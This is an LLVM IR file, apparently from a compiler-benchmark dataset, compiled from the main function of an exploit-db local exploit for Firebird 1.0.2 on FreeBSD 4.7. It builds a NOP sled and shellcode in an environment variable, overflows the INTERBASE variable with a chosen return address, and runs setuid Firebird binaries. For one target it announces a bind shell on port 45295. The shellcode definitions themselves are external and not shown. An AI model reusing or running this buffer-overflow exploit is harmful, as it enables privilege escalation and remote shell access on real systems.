; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21566.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21566.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [54 x i8] c"( ( Firebird-1.0.2 Local exploit for Freebsd 4.7 ) )\0A\00", align 1
@.str.1 = private unnamed_addr constant [54 x i8] c"( (                           by - bob@dtors.net ) )\0A\00", align 1
@.str.2 = private unnamed_addr constant [55 x i8] c"----------------------------------------------------\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"Usage: %s <target#> \0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"Targets:\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"1. [0xbfbff743] - gds_inet_server\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"2. [0xbfbff743] - gds_lock_mgr\0A\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c"3. [0xbfbff743] - gds_drop\0A\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"\0Awww.dtors.net\0A\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"INTERBASE\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [22 x i8] c"Return Address: 0x%x\0A\00", align 1
@.str.12 = private unnamed_addr constant [17 x i8] c"Buffer Size: %d\0A\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"Setuid [90]\0A\00", align 1
@inetcode = common dso_local global i32 0, align 4
@INET = common dso_local global i32 0, align 4
@lockcode = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [44 x i8] c"\0AShell is on port 45295\0AExploit will hang!\0A\00", align 1
@LOCK = common dso_local global i32 0, align 4
@dropcode = common dso_local global i32 0, align 4
@DROP = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca [1024 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 3217028931, i64* %6, align 8
  %14 = load i32, i32* @LEN, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %8, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %9, align 8
  store i32 0, i32* %12, align 4
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 2
  br i1 %19, label %20, label %34

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.2, i64 0, i64 0))
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %26)
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0))
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0))
  %33 = call i32 @exit(i32 0) #4
  unreachable

34:                                               ; preds = %2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i64 @decide(i8* %37)
  %39 = inttoptr i64 %38 to i8*
  store i8* %39, i8** %7, align 8
  %40 = trunc i64 %15 to i32
  %41 = call i32 @memset(i8* %17, i32 65, i32 %40)
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  store i8* %42, i8** %11, align 8
  store i32 0, i32* %12, align 4
  br label %43

43:                                               ; preds = %53, %34
  %44 = load i32, i32* %12, align 4
  %45 = load i8*, i8** %7, align 8
  %46 = call i32 @strlen(i8* %45)
  %47 = sub nsw i32 1024, %46
  %48 = sub nsw i32 %47, 1
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %56

50:                                               ; preds = %43
  %51 = load i8*, i8** %11, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %11, align 8
  store i8 -112, i8* %51, align 1
  br label %53

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %12, align 4
  br label %43

56:                                               ; preds = %43
  store i32 0, i32* %12, align 4
  br label %57

57:                                               ; preds = %70, %56
  %58 = load i32, i32* %12, align 4
  %59 = load i8*, i8** %7, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = icmp slt i32 %58, %60
  br i1 %61, label %62, label %73

62:                                               ; preds = %57
  %63 = load i8*, i8** %7, align 8
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = load i8*, i8** %11, align 8
  %69 = getelementptr inbounds i8, i8* %68, i32 1
  store i8* %69, i8** %11, align 8
  store i8 %67, i8* %68, align 1
  br label %70

70:                                               ; preds = %62
  %71 = load i32, i32* %12, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %12, align 4
  br label %57

73:                                               ; preds = %57
  %74 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 1023
  store i8 0, i8* %74, align 1
  %75 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %76 = call i32 @memcpy(i8* %75, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i32 4)
  %77 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %78 = call i32 @putenv(i8* %77)
  %79 = getelementptr inbounds i8, i8* %17, i64 1052
  %80 = bitcast i64* %6 to i8*
  %81 = call i32 @memcpy(i8* %79, i8* %80, i32 4)
  %82 = getelementptr inbounds i8, i8* %17, i64 1056
  store i8 0, i8* %82, align 16
  %83 = call i32 @setenv(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0), i8* %17, i32 1)
  %84 = load i32, i32* @stdout, align 4
  %85 = load i64, i64* %6, align 8
  %86 = call i32 (i32, i8*, ...) @fprintf(i32 %84, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0), i64 %85)
  %87 = load i32, i32* @stdout, align 4
  %88 = load i32, i32* @LEN, align 4
  %89 = call i32 (i32, i8*, ...) @fprintf(i32 %87, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0), i32 %88)
  %90 = load i32, i32* @stdout, align 4
  %91 = call i32 (i32, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i64 0, i64 0))
  %92 = load i8*, i8** %7, align 8
  %93 = icmp eq i8* %92, bitcast (i32* @inetcode to i8*)
  br i1 %93, label %94, label %98

94:                                               ; preds = %73
  %95 = load i32, i32* @INET, align 4
  %96 = load i32, i32* @INET, align 4
  %97 = call i32 @execl(i32 %95, i32 %96, i32* null)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %114

98:                                               ; preds = %73
  %99 = load i8*, i8** %7, align 8
  %100 = icmp eq i8* %99, bitcast (i32* @lockcode to i8*)
  br i1 %100, label %101, label %106

101:                                              ; preds = %98
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.14, i64 0, i64 0))
  %103 = load i32, i32* @LOCK, align 4
  %104 = load i32, i32* @LOCK, align 4
  %105 = call i32 @execl(i32 %103, i32 %104, i32* null)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %114

106:                                              ; preds = %98
  %107 = load i8*, i8** %7, align 8
  %108 = icmp eq i8* %107, bitcast (i32* @dropcode to i8*)
  br i1 %108, label %109, label %113

109:                                              ; preds = %106
  %110 = load i32, i32* @DROP, align 4
  %111 = load i32, i32* @DROP, align 4
  %112 = call i32 @execl(i32 %110, i32 %111, i32* null)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %114

113:                                              ; preds = %106
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %114

114:                                              ; preds = %113, %109, %101, %94
  %115 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %115)
  %116 = load i32, i32* %3, align 4
  ret i32 %116
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @decide(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @execl(i32, i32, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
